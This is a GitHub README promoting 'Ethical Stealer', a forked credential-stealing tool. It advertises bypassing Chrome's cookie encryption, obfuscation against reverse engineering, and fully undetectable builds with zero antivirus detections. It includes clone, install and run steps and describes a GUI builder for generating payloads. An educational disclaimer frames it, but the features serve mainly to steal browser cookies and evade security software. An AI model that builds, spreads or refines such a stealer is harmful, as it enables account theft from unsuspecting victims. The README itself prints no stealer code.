# Ethical Stealer Proof of Concept

<p align="center">
  <img src="https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png" alt="LoudProject Logo" width="120"/>
</p>

## Disclaimer ⚠️

This project is a **Proof of Concept** and **intended for educational purposes only**. It is designed to demonstrate the capabilities of bypassing encryption mechanisms and handling sensitive data in a secure, controlled environment. **Use this tool responsibly** and **do not engage in any illegal activities**.

The author is not responsible for any misuse or damages caused by the use of this software. It is your responsibility to ensure that the usage complies with all applicable laws and regulations.

---

## 📚 Table of Contents

- [🚀 Features](#features-)
- [⚙️ Installation](#installation-)
- [🖥️ How to Run](#how-to-run-)
- [👀 Preview](#preview-)
- [🏎️ Why Bun is Incredible](#why-bun-is-incredible-)
- [✨ Mentions](#mentions-)
- [📱 Contact](#contact-)

---

## Features 🚀

- **Ethical Stealer**: A tool designed for educational and proof of concept purposes.
- **Bypasses Chrome's Latest Cookie Encryption**: Leveraging **Bun** for its rapid speed and robust obfuscation to bypass modern encryption techniques used by Chrome.
- **Compiled with Bun and `pkg`**: Offering minimal detection rates (0/71 with Bun, 2/71 with `pkg`).
- **New special detection bypass with `pkg-fud-method`**: Offering 0 detection rates.
- **Obfuscation**: Using `javascript-obfuscator` & `js-confuser` for basic => hard obfuscation to prevent reverse engineering.

## Installation ⚙️

Before you begin, ensure that you have the following dependencies installed:

1. **Python 3.9 or above**: You can download the latest version of Python from [python.org](https://www.python.org/downloads/).

2. **Node.js Version lower than v21 (v16 recommended)**: Download and install Node.js from [Node.js v16 download](https://nodejs.org/dist/v16.20.2/node-v16.20.2-x64.msi).

3. [**Visual Studio Installer**](https://visualstudio.microsoft.com/downloads/) (for C++ support): Download and install Visual Studio with the **Desktop development with C++** workload. This is required for building and compiling C++ modules in the project.  
   ![cpp](https://i.imgur.com/ohtkvIf.png)

4. **Bun**: This will be automatically installed when you run the `start.bat` script.

5. **`pkg`**: Also installed automatically via the `start.bat` script.

To install all dependencies:
- Run `start.bat` to install electron, Bun, and `pkg` automatically.


## How to Run 🖥️

1. **Clone the repository**:
   ```bash
   git clone https://github.com/wompless/Loud-Project.git
   cd Loud-Project
   ```

2. **Install dependencies**:
   ```bash
   node install.js
   ```

3. **Start the application**:
   - Recommended: Run `start.bat` to handle everything.
   - Or manually run:
     ```bash
     npm start
     ```

4. A GUI built with **Electron** will open where you can interact with the tool.


## Preview 👀

### Bun Build Detection (0/70 Detection)

![Bun Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/BunBuildDetection%20.png)

### Pkg-fud-method Build Detection (0/70 Detection)

![Pkg-fud-method Build Detection](https://i.imgur.com/GpBku5u.png)

### Pkg Build Detection (2/70 Detection)

![Pkg Build Detection](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/PkgBuildDetection.png)

### GUI Builder Intuitive (electronJs)

![GUI](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/electronGui.png)

### Logs Execution Preview (Fork WaveStealer)

![logs](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(1).png)
![logs1](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(3).png)
![logs2](https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/logs-revie%20(2).png)


## Why Bun is Incredible 🏎️

**Bun** is a modern, ultra-fast JavaScript runtime. By using Bun, we achieve **significant speed improvements** in both execution and build times.

- **Detection rate with Bun: 0%**
- **Detection rate with pkg: 2%**

It optimizes Chrome cookie decryption bypasses with **minimal overhead**.

## Mentions ✨

Special thanks to:

- **Kisakay**: [GitHub](https://github.com/Kisakay)
- **TanevAZ**: [GitHub](https://github.com/TanevAZ)
- **VInzui**: [GitHub](https://github.com/Vinzui)
- **covllld**: [GitHub](https://github.com/covllld)

And shoutout to **Wave** for the base source inspiration.

## Contact 📱

If you have any questions or abuse reports:

👉 [Telegram: @LoudProject](https://t.me/LoudProject)

---

**Note:** This is a **Proof of Concept**. Use only in a secure, educational setting.
